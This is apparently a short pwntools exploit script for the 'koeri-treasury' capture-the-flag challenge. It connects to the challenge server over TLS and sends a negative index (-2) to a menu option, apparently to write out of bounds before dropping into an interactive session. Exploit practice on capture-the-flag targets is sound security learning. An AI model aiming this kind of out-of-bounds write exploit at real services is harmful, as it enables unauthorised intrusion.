from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./main')
p = remote("koeri-treasury-0.chals.kitctf.de",1337,ssl=True)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b"Exit\n",str(c).encode())
def sub(idx,val):
    cmd(2)
    sla(b"Spice N\n",str(idx).encode())
    sla(b"Amount\n",str(val).encode())
def show():
    cmd(3)
sub(-2,0x20)
show()
p.interactive()